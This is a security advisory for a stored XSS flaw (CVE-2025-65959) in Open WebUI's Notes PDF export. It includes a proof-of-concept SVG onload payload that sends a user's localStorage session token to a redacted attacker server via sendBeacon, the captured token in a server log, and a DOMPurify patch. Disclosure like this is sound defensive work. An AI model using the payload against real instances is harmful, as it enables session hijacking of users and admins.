# [H] Open WebUI Vulnerable to Stored DOM XSS via Note 'Download PDF'

## Summary
Severity: High
Advisory: GHSA-8wvc-869r-xfqf
CVE: CVE-2025-65959
CWE: CWE-116, CWE-79
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:N (CVSS_V3)
Published: 2025-12-04
Source: https://github.com/advisories/GHSA-8wvc-869r-xfqf
Type: github-advisory

## Affected
- npm: `open-webui` — affected >=0 <0.6.37

## Details
## Summary

A **Stored XSS vulnerability** has been discovered in Open-WebUI's Notes PDF download functionality. 
An attacker can import a Markdown file containing malicious SVG tags into Notes, allowing them to **execute arbitrary JavaScript code** and **steal session tokens** when a victim downloads the note as PDF. 

This vulnerability can be exploited by **any authenticated user**, and unauthenticated external attackers can steal session tokens from users (both admin and regular users) by sharing specially crafted markdown files.

## Details

### Vulnerability Location

**File:** `src/lib/components/notes/utils.ts`  
**Function:** `downloadPdf()`  
**Vulnerable Code (Line 35):**

```typescript
const contentNode = document.createElement('div');

contentNode.innerHTML = html;  // Direct assignment without DOMPurify sanitization

node.appendChild(contentNode);
document.body.appendChild(node);
```

### Root Cause

1. **Incomplete TipTap Editor Configuration**
   - Open-WebUI only uses TipTap StarterKit
   - No Schema definition for dangerous tags like SVG, Script
   - Unknown HTML tags are stored as raw HTML
   
2. **Missing Sanitization During PDF Generation**
   - `note.data.content.html` is directly assigned to `innerHTML`
   - No DOMPurify or other sanitization
   - Stored malicious HTML executes as-is


## PoC

### Environment
- Open-WebUI latest version (v0.6.36)
- Admin account

### Step 1: Create Malicious Markdown File

**Filename:** `token_stealer.md`

```markdown
<svg onload="navigator.sendBeacon('https://redacted/steal',localStorage.token)"></svg>
```
> navigator.sendBeacon() was used to bypass CORS.

### Step 2: Import to Notes

1. Login to Open-WebUI
2. Click **"Notes"** in the left menu
3. **Drag and drop** the Markdown file
4. Note is automatically created

### Step 3: Trigger PDF Download

1. Access Notes menu (/notes)
2. Click **⋯** on the right side of the uploaded note
3. Select **"Download"** → **"PDF document (.pdf)"**
4. JavaScript executes

### Step 4: Verify Token Theft

**Attacker's server log:**
```http
POST /steal HTTP/1.1
Host: redacted
Content-Type: text/plain;charset=UTF-8
Content-Length: 145

eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjVkMjE4ZmU4LTU2MTktNGEzNS05MWZkLTM2MzA3NDU1NGFkNCJ9.zOicE5c5FJ3ZOc9j6T2xHU-K6dbz-s1ib_hIG4LayFw
```

### And Simple PoC `alert(1)`
**Filename:** `simple_poc.md`

```markdown
<svg onload="alert(1)"></svg>
```
<img width="1089" height="310" alt="image" src="https://github.com/user-attachments/assets/ded7bb4a-d0e0-4614-8d64-3113c1f79e2f" />


---

## Impact

**CVSS 3.1 Score: 8.7 (High)**

```
CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:N
```

### Vulnerability Type
**CWE-79: Cross-site Scripting (XSS)**  
**CWE-116: Improper Encoding or Escaping of Output**

### Affected Users
- **All Open-WebUI users**
- Especially users utilizing the Notes feature

### Attack Scenario
```
1. Attacker shares malicious note (.md file) in the community
2. Victim uploads the shared note (.md file)
3. Victim downloads as PDF
4. XSS vulnerability triggers
5. Victim's session (localStorage.token) is stolen
```

---

## Recommended Patch

```typescript
// src/lib/components/notes/utils.ts:35
import DOMPurify from 'dompurify';

const contentNode = document.createElement('div');

// Sanitize with DOMPurify
contentNode.innerHTML = DOMPurify.sanitize(html, {
    ALLOWED_TAGS: [
        'p', 'br', 'strong', 'em', 'u', 'h1', 'h2', 'h3', 'h4', 'h5', 'h6',
        'ul', 'ol', 'li', 'a', 'code', 'pre', 'blockquote', 'table', 'thead',
        'tbody', 'tr', 'td', 'th'
    ],
    ALLOWED_ATTR: ['href', 'class', 'target'],
    FORBID_TAGS: ['svg', 'script', 'iframe', 'object', 'embed', 'style'],
    FORBID_ATTR: ['onload', 'onerror', 'onclick', 'onmouseover', 'onfocus'],
    ALLOW_DATA_ATTR: false
});

node.appendChild(contentNode);
```

---

## References

- OWASP XSS Prevention Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html
- DOMPurify: https://github.com/cure53/DOMPurify

---

## References
- https://github.com/open-webui/open-webui/security/advisories/GHSA-8wvc-869r-xfqf
- https://nvd.nist.gov/vuln/detail/CVE-2025-65959
- https://github.com/open-webui/open-webui/commit/03cc6ce8eb5c055115406e2304fbf7e3338b8dce
- https://github.com/open-webui/open-webui
